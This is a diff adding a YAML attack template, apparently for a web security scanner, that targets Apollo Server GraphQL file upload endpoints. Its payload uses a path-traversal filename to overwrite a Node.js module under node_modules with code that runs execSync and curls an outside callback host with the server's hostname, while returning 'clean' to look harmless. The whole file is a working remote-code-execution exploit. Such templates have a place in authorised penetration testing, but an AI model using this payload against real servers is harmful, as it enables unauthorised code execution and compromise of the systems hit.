@@ -1,0 +1,40 @@
+name: "Apollo Server Upload Attack"
+description: "Tests Apollo Server GraphQL file upload endpoints"
+author: "@HaakimSec"
+version: "1.0"
+tech_stack: "nodejs"
+
+target:
+  endpoint: "/graphql"
+  method: "POST"
+  param: "file"
+
+headers:
+  Content-Type: "multipart/form-data"
+
+graphql:
+  mutation: "singleUpload"
+  variable: "file"
+  operations_template: |
+    {"query":"mutation($file:Upload!){singleUpload(file:$file){id filename url}}","variables":{"file":null}}
+  map_template: |
+    {"0":["variables.file"]}
+
+payloads:
+  - name: "Node.js module override"
+    filename: "../../../app/node_modules/handler.js"
+    extension: ".js"
+    body: |
+      const { execSync } = require('child_process');
+      execSync('curl https://callback.server/rce?host=$(hostname)');
+      module.exports = function() { return "clean"; };
+    tags: ["nodejs", "module-overwrite", "rce"]
+
+success_indicators:
+  - "\"data\":{"
+  - "\"id\":"
+  - "\"filename\":"
+
+failure_indicators:
+  - "\"errors\":[{"
+  - "Invalid file type"
